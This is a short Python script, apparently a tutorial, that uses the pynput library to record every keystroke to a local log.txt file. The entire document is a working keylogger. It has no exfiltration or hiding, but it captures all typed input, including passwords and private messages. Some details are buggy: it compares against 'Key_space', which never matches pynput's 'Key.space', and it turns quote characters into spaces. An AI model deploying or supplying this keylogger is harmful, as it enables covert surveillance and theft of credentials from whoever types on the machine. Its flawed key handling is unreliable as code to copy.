# Listeners - Listen to keystrokes
# Use of the 'with' keyword - Release memory/resources automatically
from pynput.keyboard import Listener

def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'"," ")

    if letter == 'Key_space':
        letter = ' '

    if letter == 'Key.shift_r':
        letter = ''

    print(letter)
    with open('log.txt','a') as f:
       f.write(letter)

with Listener(on_press=write_to_file) as l:
    l.join()